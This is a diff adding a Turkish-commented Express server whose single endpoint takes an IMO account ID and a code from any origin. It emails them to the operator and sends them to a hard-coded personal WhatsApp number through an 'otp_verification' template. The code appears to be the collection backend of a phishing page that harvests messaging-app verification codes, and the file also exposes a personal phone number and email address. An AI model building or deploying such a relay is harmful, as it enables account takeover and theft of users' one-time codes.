@@ -1,0 +1,85 @@
+// server.js
+const express = require('express');
+const axios = require('axios');
+const nodemailer = require('nodemailer');
+const cors = require('cors');
+
+const app = express();
+app.use(express.json());
+app.use(cors());
+
+// ==================== AYARLAR ====================
+// WhatsApp (Meta) Ayarları
+const WHATSAPP_TOKEN = process.env.WHATSAPP_TOKEN; // Meta'dan alınacak
+const WHATSAPP_PHONE_ID = process.env.WHATSAPP_PHONE_ID; // Meta'dan alınacak
+const WHATSAPP_TO = '+905010171128'; // Senin numaran (başında + olmadan da olabilir)
+const WHATSAPP_TEMPLATE_NAME = 'otp_verification'; // Meta'da onaylatacağın şablon adı
+
+// Gmail Ayarları
+const GMAIL_USER = 'akulmetow@gmail.com';
+const GMAIL_APP_PASSWORD = process.env.GMAIL_APP_PASSWORD; // Google'dan alınacak 16 haneli şifre
+// =================================================
+
+const mailer = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+        user: GMAIL_USER,
+        pass: GMAIL_APP_PASSWORD
+    }
+});
+
+app.post('/send-demo', async (req, res) => {
+    const { code, imo_id } = req.body;
+    const time = new Date().toLocaleString('tr-TR');
+    const messageText = `Demo kodu girildi.\nİMO ID: ${imo_id}\nKod: ${code}\nZaman: ${time}`;
+    
+    const results = { email: false, whatsapp: false };
+
+    // 1. Gmail Gönderimi
+    try {
+        await mailer.sendMail({
+            from: GMAIL_USER,
+            to: GMAIL_USER, // Kendine gönderiyorsun
+            subject: 'Demo Kodu Girildi (İMO)',
+            text: messageText
+        });
+        results.email = true;
+        console.log('E-posta gönderildi.');
+    } catch (error) {
+        console.error('E-posta Hatası:', error.message);
+    }
+
+    // 2. WhatsApp Gönderimi (Meta Cloud API)
+    try {
+        const url = `https://graph.facebook.com/v21.0/${WHATSAPP_PHONE_ID}/messages`;
+        const payload = {
+            messaging_product: 'whatsapp',
+            to: WHATSAPP_TO,
+            type: 'template',
+            template: {
+                name: WHATSAPP_TEMPLATE_NAME,
+                language: { code: 'tr' }, // Şablonu Türkçe onaylattıysan 'tr'
+                components: [{
+                    type: 'body',
+                    parameters: [{ type: 'text', text: code }] // Kodu şablona gönder
+                }]
+            }
+        };
+        
+        await axios.post(url, payload, {
+            headers: {
+                'Authorization': `Bearer ${WHATSAPP_TOKEN}`,
+                'Content-Type': 'application/json'
+            }
+        });
+        results.whatsapp = true;
+        console.log('WhatsApp mesajı gönderildi.');
+    } catch (error) {
+        console.error('WhatsApp Hatası:', error.response?.data || error.message);
+    }
+
+    res.json({ success: true, results });
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Sunucu ${PORT} portunda çalışıyor`));
